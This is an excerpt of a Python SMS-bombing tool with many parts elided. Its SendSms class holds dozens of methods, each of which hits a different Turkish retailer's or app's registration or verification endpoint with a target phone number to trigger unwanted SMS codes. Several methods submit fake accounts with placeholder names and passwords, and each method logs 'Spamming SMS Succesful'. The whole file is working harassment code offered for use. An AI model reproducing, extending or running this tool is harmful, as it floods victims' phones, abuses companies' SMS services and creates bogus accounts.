...
class SendSms():
    ...
    def KahveDunyasi(self):    
        try:    
            ...
            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> core.kahvedunyasi.com")
                self.count += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> core.kahvedunyasi.com")
    ...
    def Wmf(self):
        try:
            ...
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> wmf.com.tr")
                self.count += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> wmf.com.tr")
    ...
    def Bim(self):
        try:
            ...
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> bim.veesk.net")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> bim.veesk.net")


    #englishhome.com
    def Englishhome(self):
        try:
            data = {"first_name": "Polat", "last_name": "Alemdar", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
            home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
            if home.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> englishhome.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> englishhome.com")
    ...
    def Mopas(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> mopas.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> mopas.com.tr")
    ...
    def Icq(self):
        try:
            ...
            if r.json()["response"]["statusCode"] == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> u.icq.net")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> u.icq.net")
    ...
    def Suiste(self):
        try:
            ...
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> suiste.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> suiste.com")
    ...
    def KimGb(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
    ...
    def Tazi(self):
        try:
            ...
            if (r.json()["kod"]) == "0000":
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> mobileapiv2.tazi.tech")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> mobileapiv2.tazi.tech")
    ...
    def N11(self):
        try:
            ...
            if (r.json()["isSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> mobileapi.n11.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> mobileapi.n11.com")
    ...
    def Evidea(self):
        try:
            ...
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> evidea.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> evidea.com") 
    ...
    def Marti(self):
        try:
            ...
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> customer.martiscooter.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> customer.martiscooter.com")
    ...
    def Hey(self):
        try:
            ...
            r = requests.post(url, headers=headers)
            if r.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> heyapi.heymobility.tech")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> heyapi.heymobility.tech")
    ...
    def Bineq(self):
        try:
            ...
            if r.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> bineqapi.heymobility.tech")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> bineqapi.heymobility.tech")
    ...
    def Bisu(self):
        try:
            ...
            if r.json()["errors"] == None:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> bisu.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> bisu.com.tr")
    ...
    def Ucdortbes(self):
        try:
            ...
            json={"email": "", "name": "Polat", "phoneNumber": f"+90{self.phone}", "surname": "Alemdar"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
                print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> api.345dijital.com")
            else:
                raise
        except:
            print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> api.345dijital.com")
            self.count += 1
    ...
    def Macro(self):
        try:
            ...
            if r.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> rest.macrocenter.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> rest.macrocenter.com.tr")
    ...
    def TiklaGelsin(self):
        try:
            ...
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> svc.apps.tiklagelsin.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> svc.apps.tiklagelsin.com")
    ...
    def Ayyildiz(self):
        try:
            ...
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> api.altinyildizclassics.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> api.altinyildizclassics.com")
    ...
    def Naosstars(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> api.naosstars.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> api.naosstars.com")
    ...
    def Istegelsin(self):
        try:
            ...
            if r.json()["data"]["sendOtp2"]["alreadySent"] == False:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> prod.fasapi.net")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> prod.fasapi.net")
    ...
    def Koton(self):
        try:
            ...
            r = requests.post(url, headers=headers, data=data)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> koton.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> koton.com")
    ...
    def Hayatsu(self):
        try:
            ...
            if r.json()["IsSuccessful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> hayatsu.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> hayatsu.com.tr")
    ...
    def Pisir(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.json()["ok"] == "1":
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> api.pisir.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> api.pisir.com")
    ...
    def Hizliecza(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> hizlieczaprodapi.hizliecza.net")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> hizlieczaprodapi.hizliecza.net")
    ...
    def Ipragaz(self):
        try:
            ...
            json={"birthDate": "2/7/2000", "carPlate": "31 ABC 31", "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63", "name": "Polat Alemdar", "otp": "", "phoneNumber": self.phone, "playerId": ""}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> ipapp.ipragaz.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> ipapp.ipragaz.com.tr")
    ...
    def Metro(self):
        try:
            ...
            if r.json()["status"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> feature.metro-tr.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> feature.metro-tr.com")
    ...
    def Kumport(self):
        try:
            ...
            if r.text.replace("\"", "").split(",")[1].split(":")[1].lower() == "true":
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> online.kumport.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> online.kumport.com.tr")
    ...
    def Qumpara(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> tr-api.fisicek.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> tr-api.fisicek.com")
    ...
    def Paybol(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"] == 0:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> pyb-mobileapi.walletgate.io")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> pyb-mobileapi.walletgate.io")
    ...
    def Migros(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> rest.migros.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> rest.migros.com.tr")
    ...
    def File(self):
        try:
            ...
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> api.filemarket.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> api.filemarket.com.tr")
    ...
    def Roombadi(self):
        try:
            ...
            if r.json()["remainingTime"] == 120:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> api.roombadi.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> api.roombadi.com")
    ...
    def Go(self):
        try:
            ...
            if r.json()["data"]["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> gomobilapp.ipragaz.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> gomobilapp.ipragaz.com.tr")
    ...
    def Joker(self):
        try:
            ...
            json={"firstName": "Polat", "gender": "m", "iosVersion": "4.0.2", "lastName": "Alemdar", "os": "IOS", "password": "31ABC..abc31", "phoneNumber": f"0{self.phone}", "username": self.mail}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["message"] == "Doğrulama kodu gönderildi.":
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> api.joker.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> api.joker.com.tr")
    ...
    def Akasya(self):
        try:
            ...
            if r.json()["result"] == "SMS sended succesfully!":
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> akasya-admin.poilabs.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> akasya-admin.poilabs.com")
    ...
    def Akbati(self):
        try:
            ...
            r = requests.post(url=url, headers=headers, json=json)
            if r.json()["result"] == "SMS sended succesfully!":
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> akbati-admin.poilabs.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> akbati-admin.poilabs.com")
    ...
    def Clickme(self):
        try:
            ...
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> dev-azure-mobile-api.clickmelive.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> dev-azure-mobile-api.clickmelive.com")
    ...
    def Happy(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> happy.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> happy.com.tr")
    ...
    def Komagene(self):
        try:
            ...
            r = requests.post(url=url, headers=headers, json=json)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> gateway.komagene.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> gateway.komagene.com.tr")
    ...
    def KuryemGelsin(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> api.kuryemgelsin.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> api.kuryemgelsin.com")
    ...
    def Porty(self):
        try:
            ...
            r = requests.post(url=url, json=json, headers=headers)
            if r.json()["status"]== "success":
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> panel.porty.tech")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> panel.porty.tech")
    ...
    def Taksim(self):
        try:
            ...
            r = requests.post(url=url, json=json)
            if r.json()["success"]== True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> service.taksim.digital")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> service.taksim.digital")
    ...
    def Tasdelen(self):
        try:
            ...
            if r.json()["Result"]== True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> 94.102.66.162:80")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> 94.102.66.162:80")
    ...
    def Tasimacim(self):
        try:
            ...
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> server.tasimacim.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> server.tasimacim.com")
    ...
    def ToptanTeslim(self):
        try:
            ...
            data = {"telephone": f"0{self.phone}","name": "Polat","surname": "Alemdar","email": self.mail,"password": "313131","password_confirmation": "313131"}
            r = requests.post(url=url, data=data, headers=headers)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> tt.etic.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> tt.etic.com.tr")
    ...
    def Unilever(self):
        try:
            ...
            if r.json()["status"] == 1:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> siparisdirekt.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> siparisdirekt.com")
    ...
    def Uysal(self):
        try:
            ...
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> api.uysalmarket.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> api.uysalmarket.com.tr")
    ...
    def Yapp(self):
        try:
            ...
            json={"app_version": "1.1.2", "code": "tr", "device_model": "iPhone9,4", "device_name": "", "device_type": "I", "device_version": "15.7.8", "email": self.mail, "firstname": "Polat", "is_allow_to_communication": "1", "language_id": "1", "lastname": "Alemdar", "phone_number": self.phone, "sms_code": ""}
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> yapp.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> yapp.com.tr")
    ...
    def YilmazTicaret(self):
        try:
            ...
            if r.json()["giris"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> yilmazticaret.net")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> yilmazticaret.net")
    ...
    def Yuffi(self):
        try:
            ...
            r = requests.post(url, json=json)
            if r.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> api.yuffi.co")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> api.yuffi.co")
    ...
    def  Beefull(self):
        try:
            ...
            json={"email": self.mail, "firstName": "Polat", "language": "tr", "lastName": "Alemdar", "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}
            ...
            r = requests.post(url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}Spamming SMS Succesful | [+] {Style.RESET_ALL}To: {self.phone} --> app.beefull.io")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}Spamming SMS Unsuccesful | [-] {Style.RESET_ALL}To: {self.phone} --> app.beefull.io")
